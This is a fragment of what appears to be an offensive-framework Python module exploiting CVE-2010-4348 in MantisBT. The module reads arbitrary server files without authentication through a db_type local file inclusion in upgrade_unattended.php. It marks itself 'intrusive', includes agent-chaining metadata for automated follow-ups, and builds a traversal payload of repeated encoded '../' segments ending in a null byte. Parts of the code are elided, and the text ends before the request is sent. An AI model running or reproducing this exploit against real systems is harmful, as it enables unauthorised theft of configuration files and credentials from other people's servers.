#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reads arbitrary files via CVE-2010-4348 upgrade_unattended."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'MantisBT - db_type File Read (CVE-2010-4348)',
        'description': (
            'Reads arbitrary files via CVE-2010-4348 upgrade_unattended.php db_type LFI.'
        ),
        ...
        'tags': ['mantisbt', 'lfi', 'file-read', 'unauth', 'cve-2010-4348'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2010_4348_detect'],
            },
        },
    }
    ...
    base_path = OptString('', 'MantisBT base path', required=False)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        base = str(self.base_path or '').rstrip('/')
        trav = ('..%2f' * 15) + remote + '%00'
